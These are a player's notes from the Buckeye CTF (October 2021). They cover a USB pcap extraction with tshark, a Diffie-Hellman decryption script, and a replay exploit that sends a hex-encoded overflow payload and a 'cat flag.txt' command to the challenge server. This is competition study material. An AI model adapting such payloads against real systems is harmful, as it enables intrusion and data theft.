# Buckeye ctf - October 2021 

Notes from the CTF to remember:

- ctftime link https://ctftime.org/event/1434/tasks/

- USB PCAPNG exfiltration, packet bigger than a size with a PK header, extract with tshark, 
remove new lines with tr -d "\n" and convert to binary with xxd -r:

```
tshark -r exfiltration.pcapng -Y"frame.len >= 224" -T fields -e usb.capdata
```

- KEY EXCHANGE: Diffie Hellman exchange, calculators online were no go, just modify server.py
use b as a fixed value (4) calculate B and type the public dadta you recieve to decode the flag

```
import hashlib
import Crypto.Util.number as cun
from Crypto.Cipher import AES
import binascii

p = int(input("P ->"))
g = 5

B = pow(g, 4,p)

print(f"B : {B}")

A = int(input("A -> "))

shared_secret = pow(A, 4, p)

print(f"shared secret : {shared_secret}")
# Use AES, a symmetric cipher, to encrypt the flag using the shared key
key = hashlib.sha1(cun.long_to_bytes(shared_secret)).digest()[:16]
print(f"key  : {binascii.hexlify(key)}")
cipher = AES.new(key, AES.MODE_ECB)
#ciphertext = cipher.encrypt(message)
ciphertext = input("cipher ")
msg = cipher.decrypt(binascii.unhexlify(ciphertext.encode()))
print(f"message = {msg}")
```

- REPLAY, get exploit data from PCAP and send it back, originally done with python sockets
```
import socket
import time
import binascii

HOST = 'misc.chall.pwnoh.io' 
PORT = 13371
#HOST = 'localhost'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((HOST, PORT))
time.sleep(1)
recv = s.recv(4096)
print(recv)
DATA = binascii.unhexlify('6161616162616161636161616461616165616161666161616761616168616161696161616a6161616b6161616c6161616d6161616e6161616f616161706161617161616172616161736161617461616175616161766161617761616178616161796161617a616162626161626361616264616162656161626661616267616162686161626961616255114000000000000f0000000000000057114000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000042040000000000000000000000000000000000000000000000000000000000000000000000000003b000000000000000000000000000000000000000000000057114000000000000000000000000000330000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a')
print(DATA)
s.send(DATA)
s.send(binascii.unhexlify("63617420666c61672e7478740a"))

data = s.recv(4096)
#s.send(binascii.unhexlify("69640a"))

s.close()

#d = data.encode('hex').upper()
print ('Received', repr(data))
```

Much better solution with pwn (from https://7phalange7.github.io/2021/10/25/buckeyectf.html#replay)
```
from pwn import *

target = remote('misc.chall.pwnoh.io',13371)
rawpayload = "616161616261616163...(HEX VALUES)"
payload = bytes.fromhex(rawpayload)
target.recvline()
target.sendline(payload)
target.interactive()
```
